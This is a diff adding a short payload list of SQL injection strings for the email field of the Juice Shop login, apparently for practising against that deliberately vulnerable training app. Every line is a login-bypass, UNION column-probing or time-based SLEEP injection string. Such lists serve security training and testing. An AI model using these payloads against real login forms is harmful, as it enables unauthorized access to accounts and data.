@@ -1,0 +1,15 @@
+# SQLi payloads for Juice Shop login (email field)
+# Lines starting with # are ignored by the app.
+' OR 1=1--
+' OR '1'='1
+admin'--
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' AND SLEEP(1)-- 
+' OR 1=1;-- 
+') OR '1'='1
+" OR "1"="1
+admin' OR 'x'='x' --
+# Boolean-based trick with dummy domain
+a' OR '1'='1' -- @example.com
